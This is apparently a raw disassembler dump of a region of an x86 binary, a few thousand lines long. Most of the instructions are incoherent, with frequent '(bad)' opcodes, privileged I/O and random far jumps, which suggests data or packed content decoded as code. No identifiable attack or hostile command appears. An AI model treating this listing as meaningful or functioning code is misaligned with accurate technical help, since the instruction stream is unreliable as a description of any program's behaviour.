  42fa5f:	jne    0x42f9fa
  42fa61:	cmp    dl,BYTE PTR [edi]
  42fa63:	imul   esp
  42fa65:	sbb    DWORD PTR [edx],edi
  42fa67:	aas    
  42fa68:	mov    cl,0x2a
  42fa6a:	inc    ecx
  42fa6b:	xchg   edi,eax
  42fa6c:	cld    
  42fa6d:	inc    edi
  42fa6e:	sub    dl,BYTE PTR [ebp+0x7c]
  42fa71:	mov    cs,WORD PTR [ebx+0x4e8b26f4]
  42fa77:	push   cs
  42fa78:	cmp    eax,eax
  42fa7a:	cmp    al,0x52
  42fa7c:	scas   al,BYTE PTR es:[edi]
  42fa7d:	mov    WORD PTR [ebx-0x3b],ss
  42fa80:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fa81:	cmp    al,0x81
  42fa83:	test   esi,eax
  42fa85:	lea    esi,[ecx-0x46]
  42fa88:	jecxz  0x42fa79
  42fa8a:	or     DWORD PTR [edx-0x18],esi
  42fa8d:	sub    DWORD PTR [eax-0x62],eax
  42fa90:	lods   eax,DWORD PTR ds:[esi]
  42fa91:	(bad)  
  42fa92:	cmp    al,0x5f
  42fa94:	(bad)
  42fa97:	dec    ebp
  42fa98:	repnz fist DWORD PTR [esi+0x6b]
  42fa9c:	push   ebp
  42fa9d:	test   BYTE PTR [ebp+0x605f14d8],0xf5
  42faa4:	bound  esp,QWORD PTR [eax]
  42faa6:	sahf   
  42faa7:	lahf   
  42faa8:	push   0xc77734b7
  42faad:	and    BYTE PTR [esp+eiz*2-0xd],cl
  42fab1:	xor    eax,0x5280775
  42fab6:	fs or  eax,0xfb588182
  42fabc:	inc    esi
  42fabd:	aad    0x6e
  42fabf:	mov    ebx,0xb7cade42
  42fac4:	push   cs
  42fac5:	daa    
  42fac6:	adc    ecx,DWORD PTR [eax]
  42fac8:	push   esp
  42fac9:	and    DWORD PTR [ebp+ebp*4+0x42],ebp
  42facd:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42face:	cmc    
  42facf:	jns    0x42fa7d
  42fad1:	and    BYTE PTR [edi],dh
  42fad3:	loopne 0x42fb22
  42fad5:	test   eax,0xa430479d
  42fada:	or     bl,BYTE PTR [edi-0x2f894eed]
  42fae0:	bound  ebx,QWORD PTR [ebp+edx*4-0x16858c5a]
  42fae7:	or     al,0xc1
  42fae9:	clc    
  42faea:	out    0xf0,al
  42faec:	aam    0x43
	...
  42fb56:	sbb    ebp,edi
  42fb58:	shl    BYTE PTR [esi],0xf4
  42fb5b:	aas    
  42fb5c:	(bad)  
  42fb5d:	out    dx,eax
  42fb5e:	int3   
  42fb5f:	mov    WORD PTR [edi+0x32],?
  42fb62:	lock pop eax
  42fb64:	fimul  DWORD PTR [edi]
  42fb66:	inc    DWORD PTR [bx+di]
  42fb69:	add    BYTE PTR [eax],al
  42fb6b:	add    DWORD PTR [eax],eax
  42fb6d:	add    BYTE PTR [edx],dl
  42fb6f:	test   al,0xb8
  42fb71:	test   DWORD PTR [ebx-0x4fed7914],esi
  42fb77:	inc    ebx
  42fb78:	mov    edi,0xc32fcec2
  42fb7d:	loop   0x42fb8b
  42fb7f:	shl    DWORD PTR [ebp-0x56],cl
  42fb82:	das    
  42fb83:	dec    eax
  42fb84:	mov    ah,0x35
  42fb86:	aam    0xba
  42fb88:	or     eax,0xa0e3c0b9
  42fb8d:	jbe    0x42fba3
  42fb8f:	fdiv   QWORD PTR [ecx+edi*4-0x378ecc8a]
  42fb96:	std    
  42fb97:	xlat   BYTE PTR ds:[ebx]
  42fb98:	pop    es
  42fb99:	retf   
  42fb9a:	push   ss
  42fb9b:	inc    edi
  42fb9c:	sbb    DWORD PTR [eax],esi
  42fb9e:	retf   0x150
  42fba1:	mov    ch,0x66
  42fba3:	push   ebp
  42fba4:	popf   
  42fba5:	jo     0x42fb2e
  42fba7:	mov    bl,0xd5
  42fba9:	rep movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbab:	out    dx,al
  42fbac:	xcrypt-ctr (bad)
  42fbad:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42fbae:	sahf   
  42fbaf:	inc    ebp
  42fbb0:	push   cs
  42fbb1:	jp     0x42fb92
  42fbb3:	pop    ss
  42fbb4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbb5:	add    ah,ch
  42fbb7:	fisub  WORD PTR [edx+0x1dc6392d]
  42fbbd:	(bad)  
  42fbbe:	jno    0x42fbb9
  42fbc0:	push   ss
  42fbc1:	js     0x42fc2a
  42fbc3:	lods   eax,DWORD PTR ds:[esi]
  42fbc4:	and    eax,0x12503511
  42fbc9:	dec    ebx
  42fbca:	pop    eax
  42fbcb:	jns    0x42fc42
  42fbcd:	cdq    
  42fbce:	push   esp
  42fbcf:	push   ebx
  42fbd0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fbd2:	jnp    0x42fc0a
  42fbd4:	sub    al,0x75
  42fbd6:	bound  eax,QWORD PTR gs:[eax+ecx*8-0x48]
  42fbdb:	dec    ebx
  42fbdc:	xchg   edx,eax
  42fbdd:	mov    DWORD PTR [edx+0x751aa3e5],edi
  42fbe3:	cmp    DWORD PTR [esi+0x8787079],0x44f88793
  42fbed:	push   cs
  42fbee:	xchg   BYTE PTR [eax+0x11],ah
  42fbf1:	pop    esi
  42fbf2:	leave  
  42fbf3:	cs cmp eax,0x7598dd29
  42fbf9:	and    DWORD PTR [ebx-0x6],edi
  42fbfc:	pop    es
  42fbfd:	in     eax,0x1e
  42fbff:	mov    ds:0x15feb6ed,eax
  42fc04:	lods   al,BYTE PTR ds:[esi]
  42fc05:	dec    ebp
  42fc06:	cmp    BYTE PTR [ecx+0x34],0xa2
  42fc0a:	fild   DWORD PTR [edx-0x75]
  42fc0d:	mov    ds:0xabcc0c7e,al
  42fc12:	jmp    0x2c9:0x7a72c847
  42fc19:	lods   eax,DWORD PTR ds:[esi]
  42fc1a:	mov    bh,0xe2
  42fc1c:	mov    BYTE PTR [ebp+0x7375b4c0],ch
  42fc22:	add    edi,DWORD PTR [ebx+0x5d]
  42fc25:	out    0x6f,eax
  42fc27:	mov    dl,0x28
  42fc29:	jne    0x42fbdc
  42fc2b:	add    eax,0xb1dd3d13
  42fc30:	mov    ebx,0xe70643e2
  42fc35:	loop   0x42fc53
  42fc37:	ds push ds
  42fc39:	addr16 fs mov dh,0x3a
  42fc3d:	fld    QWORD PTR [eax+ebp*4]
  42fc40:	fdiv   DWORD PTR [edx-0x25]
  42fc43:	mov    ds:0xf91a6a48,eax
  42fc48:	sub    dl,0x39
  42fc4b:	jmp    0x6941:0xf5794333
  42fc52:	lods   eax,DWORD PTR ds:[esi]
  42fc53:	call   0x6a71da0d
  42fc58:	ins    DWORD PTR es:[edi],dx
  42fc59:	outs   dx,DWORD PTR ds:[esi]
  42fc5a:	add    eax,0xa54f85f8
  42fc5f:	sbb    dl,bl
  42fc61:	nop    ebx
  42fc64:	retf   0x2d21
  42fc67:	shr    BYTE PTR [ebp-0x1f],cl
  42fc6a:	push   ebp
  42fc6b:	sti    
  42fc6c:	ds pop ss
	...
  42fcd6:	or     ecx,DWORD PTR [eax+0x3ba319a3]
  42fcdc:	mov    ebx,0x36325e9a
  42fce1:	and    dh,ch
  42fce3:	mov    cl,0x24
  42fce5:	and    BYTE PTR [edi+0x0],0x2
  42fce9:	add    BYTE PTR [eax],al
  42fceb:	add    DWORD PTR [eax],eax
  42fced:	add    BYTE PTR [ebx+0x6cd58a0b],bl
  42fcf3:	repz out dx,eax
  42fcf5:	sub    BYTE PTR [edi-0x6989fa7e],al
  42fcfb:	mov    dh,BYTE PTR [esi+0x2b17f27]
  42fd01:	sbb    eax,0xc59cbc50
  42fd06:	in     al,dx
  42fd07:	cdq    
  42fd08:	mov    edi,0x8b1a0b95
  42fd0d:	into   
  42fd0e:	mov    dl,BYTE PTR [edi+0x66]
  42fd11:	rcr    DWORD PTR [ecx],cl
  42fd13:	sub    BYTE PTR [ebx+edx*2],ch
  42fd16:	xor    BYTE PTR [ebx],0xd6
  42fd19:	aaa    
  42fd1a:	lods   eax,DWORD PTR ds:[esi]
  42fd1b:	sar    BYTE PTR [esi+0x26],cl
  42fd1e:	outs   dx,BYTE PTR ds:[esi]
  42fd1f:	xor    ch,BYTE PTR [ebx-0xb]
  42fd22:	mov    ecx,0x993cb4c
  42fd27:	lock pop edx
  42fd29:	pop    edx
  42fd2a:	sub    dl,BYTE PTR [ebx-0x69]
  42fd2d:	icebp  
  42fd2e:	jae    0x42fd86
  42fd30:	pop    esp
  42fd31:	out    0x55,al
  42fd33:	push   eax
  42fd34:	xor    ecx,DWORD PTR [ebp+0x50]
  42fd37:	jecxz  0x42fd50
  42fd39:	ror    BYTE PTR [esi+0x9],0xc4
  42fd3d:	aad    0xc0
  42fd3f:	and    DWORD PTR [eax+0x111ccbe2],ebx
  42fd45:	fdiv   QWORD PTR [edi-0x6f7638fa]
  42fd4b:	push   ds
  42fd4c:	mov    al,0x87
  42fd4e:	pop    edi
  42fd4f:	out    dx,al
  42fd50:	call   0xbc57381c
  42fd55:	mov    bl,0xbc
  42fd57:	popf   
  42fd58:	js     0x42fdcf
  42fd5a:	adc    BYTE PTR [ecx],0x88
  42fd5d:	dec    esi
  42fd5e:	mov    cl,0xcc
  42fd60:	and    BYTE PTR [eax-0x79],bh
  42fd63:	aad    0x51
  42fd65:	add    ah,bh
  42fd67:	or     al,0x6f
  42fd69:	iret   
  42fd6a:	int3   
  42fd6b:	sbb    eax,0x20cf5187
  42fd70:	call   0x9f10:0x1a3f76b
  42fd77:	jbe    0x42fd90
  42fd79:	in     eax,dx
  42fd7a:	xor    dl,BYTE PTR [ebx]
  42fd7c:	sar    BYTE PTR [ecx],cl
  42fd7e:	jmp    0xc1f15922
  42fd83:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42fd84:	push   cs
  42fd85:	inc    eax
  42fd86:	inc    ebx
  42fd87:	xchg   esi,eax
  42fd88:	lock fs xor esp,ebp
  42fd8c:	xchg   ebp,eax
  42fd8d:	or     DWORD PTR [ebp+0x7c],0x80bfeff5
  42fd94:	sbb    bh,BYTE PTR [ebp-0x65]
  42fd97:	cmp    edx,DWORD PTR [ebp+0x3a3a7cb8]
  42fd9d:	aam    0x19
  42fd9f:	fadd   QWORD PTR [edi+0x1]
  42fda2:	sub    esi,DWORD PTR [ebx+0x5a]
  42fda5:	mov    ds:0xaa743d90,al
  42fdaa:	test   DWORD PTR [esi],esp
  42fdac:	push   eax
  42fdad:	jno    0x42fdfe
  42fdaf:	stc    
  42fdb0:	push   ds
  42fdb1:	stos   BYTE PTR es:[edi],al
  42fdb2:	add    BYTE PTR [ebx],0x8d
  42fdb5:	adc    DWORD PTR [ecx+0x7],esi
  42fdb8:	fwait
  42fdb9:	inc    ebp
  42fdba:	or     BYTE PTR [edx-0x74],dl
  42fdbd:	mov    cs,ecx
  42fdbf:	cs pop esp
  42fdc1:	inc    esp
  42fdc2:	inc    edi
  42fdc3:	adc    dh,BYTE PTR [edi+0x392b843e]
  42fdc9:	mov    ?,WORD PTR [ecx-0x8]
  42fdcc:	sbb    cl,dl
  42fdce:	add    al,BYTE PTR [ecx+0x4a]
  42fdd1:	sbb    edx,edx
  42fdd3:	hlt    
  42fdd4:	stos   BYTE PTR es:[edi],al
  42fdd5:	pop    esi
  42fdd6:	mov    bh,0xdf
  42fdd8:	(bad)  
  42fdd9:	pop    ss
  42fdda:	push   edi
  42fddb:	hlt    
  42fddc:	icebp  
  42fddd:	jnp    0x42fde2
  42fddf:	push   edx
  42fde0:	scas   eax,DWORD PTR es:[edi]
  42fde1:	mov    al,ds:0x96210bda
  42fde6:	out    0xdf,al
  42fde8:	leave  
  42fde9:	retf   
  42fdea:	xchg   ebx,ecx
  42fdec:	cld    
  42fded:	cld    
	...
  42fe56:	dec    eax
  42fe57:	rol    dl,0xf0
  42fe5a:	retf   0x7af2
  42fe5d:	clc    
  42fe5e:	cmc    
  42fe5f:	inc    edx
  42fe60:	stos   BYTE PTR es:[edi],al
  42fe61:	repz add DWORD PTR [ebx+0x1670f38],ebx
  42fe68:	add    al,BYTE PTR [eax]
  42fe6a:	add    BYTE PTR [ecx],al
  42fe6c:	add    BYTE PTR [eax],al
  42fe6e:	ss cmp al,0x53
  42fe71:	inc    eax
  42fe72:	pop    edx
  42fe73:	push   0xe7f1d55c
  42fe78:	xchg   edi,eax
  42fe79:	mov    ebx,0xa5cbebe0
  42fe7e:	jle    0x42fe9e
  42fe80:	mov    dh,0x72
  42fe82:	(bad)  [eax+0x4d11999e]
  42fe88:	enter  0x4a2e,0x81
  42fe8c:	push   DWORD PTR [edx+0x4b]
  42fe8f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fe90:	jno    0x42fe83
  42fe92:	scas   al,BYTE PTR es:[edi]
  42fe93:	fs test al,0x68
  42fe96:	or     BYTE PTR [eax-0x62],dl
  42fe99:	outs   dx,BYTE PTR ds:[esi]
  42fe9a:	retf   0xb641
  42fe9d:	adc    eax,0x1d30473
  42fea2:	stc    
  42fea3:	xchg   ecx,eax
  42fea4:	pop    ds
  42fea5:	shr    BYTE PTR [eax+0x432911e1],0xfe
  42feac:	mov    al,ds:0x58821fb6
  42feb1:	call   DWORD PTR [esi+0x65]
  42feb4:	dec    esp
  42feb5:	das    
  42feb6:	loope  0x42febd
  42feb8:	nop
  42feb9:	dec    esp
  42feba:	inc    esi
  42febb:	sbb    bl,ch
  42febd:	pop    es
  42febe:	call   0x43bc78e2
  42fec3:	and    al,0x65
  42fec5:	mov    ebx,0xc24d5375
  42feca:	mov    dl,0x88
  42fecc:	(bad)  
  42fecd:	ds jns 0x42fef0
  42fed0:	inc    ebp
  42fed1:	stos   DWORD PTR es:[edi],eax
  42fed2:	inc    ecx
  42fed3:	popf   
  42fed4:	rcr    BYTE PTR [ecx-0x3bd2ee6b],cl
  42feda:	mov    DWORD PTR [eax+0x1f],ebp
  42fedd:	cvtps2pi mm3,xmm4
  42fee0:	mov    edx,0xffe3fedf
  42fee5:	outs   dx,BYTE PTR ds:[esi]
  42fee6:	imul   esi,DWORD PTR [esi+0x6fa89957],0xaf605d42
  42fef0:	pop    ss
  42fef1:	mov    esi,0xe22bc0c7
  42fef6:	jl     0x42ff25
  42fef8:	in     eax,0x86
  42fefa:	call   0x92c3:0xcd5b1ba3
  42ff01:	(bad)  
  42ff02:	rcl    DWORD PTR [edi],0x82
  42ff05:	aaa    
  42ff06:	xchg   edx,eax
  42ff07:	call   0xdefbb7cc
  42ff0c:	mov    dh,0x9a
  42ff0e:	mov    al,ds:0xa417ecd6
  42ff13:	sbb    BYTE PTR [edi],dl
  42ff15:	cmp    al,0xf4
  42ff17:	sar    ah,cl
  42ff19:	and    eax,0x4c4c972b
  42ff1e:	and    dh,BYTE PTR [ecx+0x7f5e9763]
  42ff24:	loopne 0x42ff47
  42ff26:	xlat   BYTE PTR ds:[ebx]
  42ff27:	jnp    0x42ff7c
  42ff29:	xlat   BYTE PTR ds:[ebx]
  42ff2a:	xor    DWORD PTR [edi-0x2265ba19],ebp
  42ff30:	fst    st(6)
  42ff32:	and    ebx,DWORD PTR [edi+eax*4-0x668cf2e3]
  42ff39:	jbe    0x42ff18
  42ff3b:	pop    esi
  42ff3c:	mov    esi,0xdcc65ded
  42ff41:	dec    esi
  42ff42:	mov    dh,0x57
  42ff44:	adc    ebp,0xffffffe8
  42ff47:	sar    BYTE PTR [ebx],cl
  42ff49:	fs push ecx
  42ff4b:	mov    edi,0x956f2a2b
  42ff50:	jmp    0x47f49442
  42ff55:	fisubr WORD PTR [eax]
  42ff57:	cwde   
  42ff58:	pop    ecx
  42ff59:	add    DWORD PTR [ebx+0x65c53dd8],0x7c45934f
  42ff63:	cwde   
  42ff64:	mov    BYTE PTR [edx+edx*4+0x64],al
  42ff68:	cmp    eax,0xbad5467b
  42ff6d:	pop    esi
	...
  42ffd6:	add    al,0x67
  42ffd8:	std    
  42ffd9:	aaa    
  42ffda:	(bad)  
  42ffdb:	mov    edi,0x9ffa77ce
  42ffe0:	shl    DWORD PTR [ebx+ebp*1+0x1],0xf8
  42ffe5:	push   ds
  42ffe6:	add    al,BYTE PTR [bp+si]
  42ffe9:	add    BYTE PTR [eax],al
  42ffeb:	add    DWORD PTR [eax],eax
  42ffed:	add    bl,bh
  42ffef:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42fff0:	and    esi,edi
  42fff2:	xor    al,0x68
  42fff4:	aaa    
  42fff5:	xchg   esp,eax
  42fff6:	out    0x18,al
  42fff8:	iret   
  42fff9:	pop    edx
  42fffa:	lea    ebp,[esi]
  42fffc:	push   ebp
  42fffd:	sub    ecx,esp
  42ffff:	jp     0x42ffbc
  430001:	out    dx,eax
  430002:	icebp  
  430003:	dec    esp
  430004:	jo     0x42ffc0
  430006:	mov    gs,WORD PTR [ebp+0x5b]
  430009:	sub    edi,DWORD PTR [esi+0x42]
  43000c:	jo     0x42ffcb
  43000e:	jb     0x430060
  430010:	(bad)
  430013:	jo     0x43003f
  430015:	and    BYTE PTR [edi],dh
  430017:	mov    ch,0x8
  430019:	inc    esp
  43001a:	adc    ebx,DWORD PTR [edi+ebx*2]
  43001d:	hlt    
  43001e:	jle    0x42ffc5
  430020:	into   
  430021:	in     al,0xed
  430023:	sub    al,0x94
  430025:	inc    esp
  430026:	retf   0x3192
  430029:	mov    eax,0x2637660c
  43002e:	mov    esi,ecx
  430030:	test   DWORD PTR [edi+eiz*2],esp
  430033:	adc    BYTE PTR [ebx],al
  430035:	inc    eax
  430036:	or     ah,ch
  430038:	out    dx,eax
  430039:	stos   DWORD PTR es:[edi],eax
  43003a:	loop   0x42ffea
  43003c:	dec    dl
  43003e:	shr    DWORD PTR [ebx],cl
  430040:	mov    WORD PTR [edx-0x326d699],?
  430046:	and    DWORD PTR [edi],ecx
  430048:	mov    ds:0x64e44fbc,al
  43004d:	cmp    DWORD PTR [edx],esi
  43004f:	jmp    0x430037
  430051:	inc    ebx
  430052:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430053:	jo     0x42ffff
  430055:	in     eax,0xf6
  430057:	imul   edx,DWORD PTR [esi],0x7adafd20
  43005d:	or     al,dh
  43005f:	adc    al,0x41
  430061:	loop   0x42ffeb
  430063:	dec    esi
  430064:	loope  0x43008a
  430066:	mov    al,ds:0x5d0d66aa
  43006b:	sub    DWORD PTR [ebx-0x71],eax
  43006e:	jae    0x430077
  430070:	mov    esi,0xb176c634
  430075:	les    eax,FWORD PTR [esi-0x4e]
  430078:	or     ebp,DWORD PTR [edx-0x7662df07]
  43007e:	test   DWORD PTR [ebx+0x48da3256],0xd9ed3418
  430088:	call   0x8587:0x6301a120
  43008f:	test   eax,0x9ddbe455
  430094:	out    dx,eax
  430095:	mov    al,ds:0xbf4707d8
  43009a:	aad    0x88
  43009c:	scas   eax,DWORD PTR es:[edi]
  43009d:	mov    eax,0x1b934619
  4300a2:	xor    ax,0xca04
  4300a6:	jle    0x430043
  4300a8:	push   es
  4300a9:	fldenv [ecx-0x2ec2a47]
  4300af:	enter  0xa19f,0x85
  4300b3:	sbb    bl,BYTE PTR [ebx-0x18]
  4300b6:	xchg   esi,eax
  4300b7:	inc    ebp
  4300b8:	popf   
  4300b9:	jbe    0x430138
  4300bb:	mov    ds:0x423e7b34,eax
  4300c0:	fadd   DWORD PTR [ecx]
  4300c2:	lods   eax,DWORD PTR ds:[esi]
  4300c3:	es inc esi
  4300c5:	adc    al,0x31
  4300c7:	push   ebp
  4300c8:	lea    ebp,[eax+0x6f0e9f56]
  4300ce:	pop    esi
  4300cf:	out    0x2b,al
  4300d1:	mov    ch,0xba
  4300d3:	retf   
  4300d4:	cwde   
  4300d5:	mov    al,0xd2
  4300d7:	sbb    ch,ah
  4300d9:	jnp    0x430087
  4300db:	jbe    0x4300a5
  4300dd:	xchg   DWORD PTR [ebx],ebx
  4300df:	out    dx,eax
  4300e0:	sub    bh,0xda
  4300e3:	xchg   ebx,eax
  4300e4:	shl    BYTE PTR [edi-0x12590d10],0x88
  4300eb:	cwde   
  4300ec:	add    al,0xd9
	...
  430156:	(bad)  
  430157:	ins    DWORD PTR es:[edi],dx
  430158:	aam    0xb5
  43015a:	(bad)  
  43015b:	mov    ebp,0x9547fe7
  430160:	scas   eax,DWORD PTR es:[edi]
  430161:	add    al,0x21
  430163:	addr16 dec ebx
  430165:	sbb    esp,DWORD PTR [edi+0x3]
  430168:	add    al,BYTE PTR [eax]
  43016a:	cmp    DWORD PTR [eax],eax
  43016c:	add    BYTE PTR [eax],al
  43016e:	push   edx
  43016f:	inc    esp
  430170:	xor    al,0x5c
  430172:	pop    ss
  430173:	pop    edi
  430174:	sub    edx,eax
  430176:	outs   dx,DWORD PTR ds:[esi]
  430177:	mov    eax,ds:0x23bea592
  43017c:	jge    0x43015b
  43017e:	xor    al,0x99
  430180:	sbb    BYTE PTR [edx],ah
  430182:	push   edx
  430183:	(bad)
  430186:	sti    
  430187:	mov    ebx,0x1484fef2
  43018c:	aas    
  43018d:	sti    
  43018e:	sbb    eax,0x407a5318
  430193:	stos   DWORD PTR es:[edi],eax
  430194:	leave  
  430195:	mov    DWORD PTR [edx-0x7f],ebx
  430198:	icebp  
  430199:	call   DWORD PTR [ecx+ecx*4-0x412d131a]
  4301a0:	adc    ebp,ecx
  4301a2:	mov    edi,0xde1ec6b4
	...
  4301d3:	add    BYTE PTR [eax],al
  4301d5:	add    BYTE PTR [ebp+0x55],cl
  4301d8:	mov    DWORD PTR [ebx-0x7e9e13f8],ecx
  4301de:	mov    esp,ebp
  4301e0:	or     al,ah
  4301e2:	dec    ebp
  4301e3:	add    bh,al
  4301e5:	add    BYTE PTR [eax],cl
  4301e7:	add    BYTE PTR [eax],al
  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
